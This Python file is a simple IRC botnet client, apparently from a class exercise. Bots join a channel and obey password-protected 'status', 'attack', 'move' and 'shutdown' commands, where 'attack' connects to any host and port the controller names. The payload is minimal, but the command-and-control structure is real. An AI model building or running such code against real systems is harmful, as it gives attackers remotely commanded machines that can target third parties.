import random, socket, sys

HOST = ""
PORT = -1
NICK = ""
PASS = ""
CHAN = ""

BUF_SIZE = 1024

botName = ""
atk_couter=1

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def startConn():



    while 1:
        botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(6))
        global botName
        botName = "nicebot-" + botNum

        usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)

        s.send(usr.encode('utf-8'))
        nick = "NICK %s \r\n" % (botName)
        s.send(nick.encode('utf-8'))
        rec = s.recv(1024).decode("utf-8")
        print(rec)
        prefix, command, args = parsemsg(rec)

        if command != "433":
            break

    chan = "JOIN %s\r\n" % (CHAN)
    s.send(chan.encode('utf-8'))
    listen(s)

def listen(s):


    while 1:
       rec = s.recv(1024).decode("utf-8")
       prefix, command, args = parsemsg(rec)
       print("prefix: "+prefix)
       print("command: " + command)
       print("args: " + str(args))

       if (command=="PING"):
           s.send(("PONG :"+args[0].rstrip()).encode('utf-8'))

       if (command =="PRIVMSG"):
            msg = args[1].rstrip().split(" ")
            print(str(msg))
            clientNick = prefix.split("!")
            if (msg[0]== PASS):
                if msg[1] == "status":
                    clientNick = prefix.split("!")
                    print(clientNick[0])
                    status(clientNick[0],s)
                elif msg[1] == "attack":
                    attack(msg[2], msg[3], clientNick[0])
                elif msg[1] == "move":
                    print(clientNick[0])
                    break
                elif msg[1] == "shutdown":
                    shutdown(clientNick[0])

       print(rec)

    move(msg[2], msg[3], msg[4], clientNick[0])


#from carlos' twitch IRC bot, idk if it works with other IRCs
def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
        raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)

    # parsemsg(":test!~test@test.com PRIVMSG #channel :Hi!")
    # ('test!~test@test.com', 'PRIVMSG', ['#channel', 'Hi!'])

    return prefix, command, args

def status(clinetNick,s):

    msg = "PRIVMSG "+clinetNick+" :" +PASS + " status "+botName+"\r\n"
    print(msg)
    s.send(msg.encode('utf-8'))
    #private message controller

def attack(atkhost, atkport, clinetNick):
    global atk_couter
    atkmsg = str(atk_couter) + " " + botName +"\n"
    success=False
    try:

        atkSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        atkSock.connect((atkhost, int(atkport)))
        atkSock.send(atkmsg.encode('utf-8'))
        atkSock.close()
        success = True
    except:
        print("attack failed")

    atk_couter += 1
    res = "PRIVMSG "+clinetNick+" :" +PASS + " attack "+str(success)+" "+botName+"\r\n"
    s.send(res.encode('utf-8'))


def move(newhost, newport, newchan, clientNick):
    global s
    reportmsg = "PRIVMSG %s :%s moved\r\n" % (clientNick, PASS)
    print(reportmsg)
    s.send(reportmsg.encode('utf-8'))
    success = False
    s.send(("QUIT\r\n").encode('utf-8'))
    s.close()
    global HOST
    HOST=newhost
    global PORT
    PORT=int(newport)
    global CHAN
    CHAN="#"+newchan

    s2 = None
    try:
        print(HOST)
        print(PORT)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
    except:
        print("failed to move to new channel")  # we may want to handle a few more specific errors, this is general for now
        sys.exit(1)

    startConn()

    #if failure, keep trying? or maybe stay on old IRC?

def shutdown(clientNick):
    sut = "PRIVMSG %s :%s shutdown %s\r\n" % (clientNick, PASS, botName)
    print(sut)
    s.send(sut.encode('utf-8'))
    s.send(("QUIT\r\n").encode('utf-8'))
    sys.exit(0)


# python bot.py 199.116.235.44 12399 group12 pass
if __name__ == '__main__':
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    CHAN = "#" + sys.argv[3]
    PASS = sys.argv[4]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    startConn()
